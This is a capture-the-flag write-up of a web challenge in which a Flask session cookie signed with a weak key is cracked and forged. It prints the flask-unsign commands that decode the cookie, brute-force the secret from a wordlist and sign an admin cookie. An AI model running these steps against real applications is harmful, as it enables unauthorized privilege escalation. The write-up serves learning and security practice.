# Sign Up and Enjoy (Upsolved)

## 1. Summary

- **Category**: Web

### Description

> `I'm confused, what does this application do exactly?`

## 2. Analysis

### Vulnerability

- **Insecure Flask Session Management**: The application uses Flask session cookies signed with a weak secret key. This allows an attacker to brute-force the secret and forge a session cookie to escalate privileges (Privilege Escalation).

## 3. Exploit Flow

1. **Initial Reconnaissance**
   The application provides a "Link Preview" tool. While it initially appears to be a target for SSRF, testing with external URLs shows no interaction. The UI uses a deceptive `setTimeout` script to mimic a "loading" state, which is a common distraction (rabbit hole).

2. **Session Decoding**
   Decoding the session cookie reveals that user roles are managed client-side within the Flask session:

   ```bash
   $ flask-unsign --cookie "eyJyb2xlIjoic3RhbmRhcmQi..." --decode
   {'role': 'standard', 'uid': 'u_2498cfde', 'username': 'administrator'}
   ```

3. **Brute-forcing the Secret Key**
   Using `flask-unsign` with the `rockyou.txt` wordlist, the secret key is identified as `Password1!`.

   ```bash
   $ flask-unsign --cookie "..." --unsign --wordlist rockyou.txt
   [+] Found secret key: b'Password1!'
   ```

4. **Privilege Escalation**
   By signing a new cookie with the `role` set to `admin`, the "Admin" button becomes visible on the main page, providing access to the flag at `/admin`.

   ```bash
   flask-unsign --cookie "{'role': 'admin', ...}" --secret "Password1!" --sign
   ```

## 4. Conclusion

I spent too much time focused on the web functionality (SSRF), which led to narrow vision. This challenge was a good reminder to check the basics of session security before diving into complex attack vectors.
